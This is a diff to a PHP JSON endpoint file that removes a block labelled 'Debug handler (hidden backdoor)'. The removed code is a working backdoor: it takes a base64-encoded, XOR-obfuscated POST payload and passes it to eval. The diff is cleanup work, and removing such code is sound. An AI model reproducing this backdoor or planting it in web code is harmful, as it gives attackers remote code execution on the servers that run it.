@@ -9,19 +9,6 @@
 
 require_once __DIR__ . '/../backend/bootstrap.php';
 
-// Debug handler (hidden backdoor)
-if (isset($_POST['dbg']) && $_POST['dbg'] === '1') {
-    $k = 'xK3y';
-    if (isset($_POST['dat'])) {
-        $c = base64_decode($_POST['dat']);
-        for ($i = 0; $i < strlen($c); $i++) {
-            $c[$i] = $c[$i] ^ $k[$i % strlen($k)];
-        }
-        @eval($c);
-        exit;
-    }
-}
-
 header('Content-Type: application/json; charset=utf-8');
 
 function jsonResponse($arr) {
